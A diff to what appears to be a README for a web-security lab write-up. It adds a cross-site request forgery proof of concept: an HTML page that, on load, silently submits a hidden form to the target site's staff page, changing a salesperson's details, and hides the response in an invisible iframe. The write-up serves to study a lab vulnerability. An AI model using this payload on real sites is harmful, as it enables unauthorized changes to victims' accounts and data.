@@ -57,9 +57,30 @@ Description:
 
 Vulnerability #2: Cross-Site Request Forgery
 
+```
+<!doctype html>
+<html lang="en">
+  <head>
+    <title></title>
+  </head>
+  <body onload="document.ohnoForm.submit()">
+  <h1>Some random important content</h1>
+  <h2>definitely not a trap.</h2>
+    <form name="ohnoForm" action="https://35.184.88.145/red/public/staff/salespeople/show.php?id=3" method="POST" style="display: none;" target="secretIFrame" > <br />
+      <input type="hidden" name="csrf_token" value="" /> <br />
+      <input type="text" name="first_name" value="Oh" /> <br />
+      <input type="text" name="last_name" value="No" /> <br />
+      <input type="text" name="phone" value="555-867-5309" /><br />
+      <input type="text" name="email" value="bleh@example.org" /><br />
+    </form>
+    <iframe name="secretIFrame" style="display:none;"></iframe>
+  </body>
+</html>
+```
+
 Description:
 
-<img src="red-vuln2.gif">
+<img src="http://g.recordit.co/s81R3gbEvc.gif">
 
 
 ## Notes
